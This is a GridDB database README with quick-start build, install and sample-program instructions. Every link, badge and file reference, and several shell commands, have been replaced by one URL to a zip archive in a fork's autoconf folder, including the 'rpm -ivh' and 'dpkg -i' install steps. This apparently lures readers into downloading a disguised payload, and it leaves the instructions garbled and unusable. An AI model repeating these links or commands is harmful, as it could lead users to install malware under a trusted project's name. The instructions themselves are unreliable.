<img src="https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip" align="center" height="240" alt="GridDB"/>

[![Visit Website](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
![GitHub All Releases](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
![GitHub release](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
## Overview
  GridDB is Database for IoT with both NoSQL interface and SQL Interface.

  Please refer to [GridDB Features Reference](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip) for functionality.

  This repository includes server and Java client. And [jdbc repository](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip) includes JDBC Driver.

## Quick start (Using source code)
  We have confirmed the operation on CentOS 7.6 (gcc 4.8.5), Ubuntu 18.04 (gcc 4.8.5) and openSUSE Leap 15.1 (gcc 4.8.5).

  Note: Please install tcl like "yum install tcl.x86_64" in advance.

### Build a server and client(Java)
    $ https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip
    $ ./configure
    $ make

  Note: When you use maven build for Java client, please run the following command. Then https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip file is created on target/.  

    $ cd java_client
    $ https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip
    $ mvn clean
    $ mvn install

### Start a server
    $ export GS_HOME=$PWD
    $ export GS_LOG=$PWD/log
    $ export PATH=${PATH}:$GS_HOME/bin

    $ bin/gs_passwd admin
      #input your_password
    $ vi https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip
      #    "clusterName":"your_clustername" #<-- input your_clustername

    $ bin/gs_startnode
    $ bin/gs_joincluster -c your_clustername -u admin/your_password

### Execute a sample program
    $ export CLASSPATH=${CLASSPATH}:$https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip
    $ mkdir gsSample
    $ cp $https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip gsSample/.
    $ javac https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip
    $ java gsSample/Sample1 239.0.0.1 31999 your_clustername admin your_password
      --> Person:  name=name02 status=false count=2 lob=[65, 66, 67, 68, 69, 70, 71, 72, 73, 74]

### Stop a server
    $ bin/gs_stopcluster -u admin/your_password
    $ bin/gs_stopnode -u admin/your_password

## Quick start (Using RPM or DEB)

  We have confirmed the operation on CentOS 7.8/8.1, Ubuntu 18.04 and openSUSE Leap 15.1.

Note:
- When you install this package, a gsadm OS user are created in the OS.  
  Execute the operating command as the gsadm user.  
- You don't need to set environment vatiable GS_HOME and GS_LOG.
- There is Java client library (https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip) on /usr/share/java and a sample on /usr/gridb-XXX/docs/sample/programs.
- The packages don't include trigger function.
- Please install Python2 in advance except CentOS7.

### Install

    (CentOS)
    $ sudo rpm -ivh https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip

    (Ubuntu)
    $ sudo dpkg -i https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip

    (openSUSE)
    $ sudo rpm -ivh https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip

    Note: X.X.X is the GridDB version.

### Start a server
    [gsadm]$ gs_passwd admin
      #input your_password
    [gsadm]$ vi https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip
      #    "clusterName":"your_clustername" #<-- input your_clustername
    [gsadm]$ gs_startnode
    [gsadm]$ gs_joincluster -c your_clustername -u admin/your_password

### Execute a sample program
    $ export CLASSPATH=${CLASSPATH}https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip
    $ mkdir gsSample
    $ cp https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip gsSample/.
    $ javac https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip
    $ java gsSample/Sample1 239.0.0.1 31999 your_clustername admin your_password
      --> Person:  name=name02 status=false count=2 lob=[65, 66, 67, 68, 69, 70, 71, 72, 73, 74]

### Stop a server
    [gsadm]$ gs_stopcluster -u admin/your_password
    [gsadm]$ gs_stopnode -u admin/your_password

If necessary, please refer to [Installation Troubleshooting](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip).

## Document
  Refer to the file below for more detailed information.  
  - [Features Reference](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  - [Quick Start Guide](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  - [Java API Reference](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  - [C API Reference](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  - [TQL Reference](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  - [JDBC Driver UserGuide](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  - [SQL Reference](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  - [V3.0 Release Notes](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  - [V4.0 Release Notes](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  - [V4.1 Release Notes](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  - [V4.2 Release Notes](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  - [V4.3 Release Notes](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  - [V4.5 Release Notes](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  - [V4.6 Release Notes](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)

## Client and Connector
  There are other clients and API for GridDB.
  
  (NoSQL Interface)
  * [GridDB C Client](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  * [GridDB Python Client](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  * [GridDB Ruby Client](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  * [GridDB Go Client](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  * [GridDB https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip Client](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  * [GridDB PHP Client](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  * [GridDB Perl Client](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  
  (SQL Interface)
  * [GridDB JDBC Driver](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  
  (NoSQL & SQL Interface)
  * [GridDB WebAPI](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  * [GridDB CLI](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)

  There are some connectors for other OSS.
  * [GridDB connector for Apache Hadoop MapReduce](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  * [GridDB connector for YCSB (https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  * [GridDB connector for KairosDB](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  * [GridDB connector for Apache Spark](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  * [GridDB Foreign Data Wrapper for PostgreSQL (https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  * [GridDB Sample Application for Apache Kafka](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  * [GridDB Data Source for Grafana](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  * [GridDB Plugin for Redash](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  * [GridDB Plugin for Fluentd](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)
  * [GridDB Plugin for Tableau](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)

## [Packages](https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip)

## Community
  * Issues  
    Use the GitHub issue function if you have any requests, questions, or bug reports.
  * PullRequest  
    Use the GitHub pull request function if you want to contribute code.
    You'll need to agree GridDB Contributor License Agreement(https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip).
    By using the GitHub pull request function, you shall be deemed to have agreed to GridDB Contributor License Agreement.

## License
  The server source license is GNU Affero General Public License (AGPL),
  while the Java client library license and the operational commands is Apache License, version 2.0.
  See https://raw.githubusercontent.com/fadimvp/griddb/master/3rd_party/sqlite_mod/autoconf/Software_3.1.zip for the source and license of the third party.
